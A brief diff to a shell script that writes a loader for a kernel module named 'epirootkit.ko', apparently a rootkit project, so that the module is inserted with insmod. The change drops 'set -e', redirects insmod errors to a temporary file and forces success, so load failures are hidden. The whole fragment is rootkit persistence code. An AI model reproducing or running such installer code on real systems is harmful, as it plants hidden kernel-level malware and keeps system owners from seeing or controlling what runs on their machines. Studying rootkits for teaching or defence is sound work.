@@ -33,8 +33,7 @@ LOAD_PATH="$LOAD_DIR/epirootkit-load"
 mkdir -p "$LOAD_DIR"
 cat > "$LOAD_PATH" << 'EOF'
 #!/bin/sh
-set -e
-/sbin/insmod /lib/epirootkit/epirootkit.ko
+/sbin/insmod /lib/epirootkit/epirootkit.ko 2> /tmp/insmod.err || true
 EOF
 
 chmod +x "$LOAD_PATH"
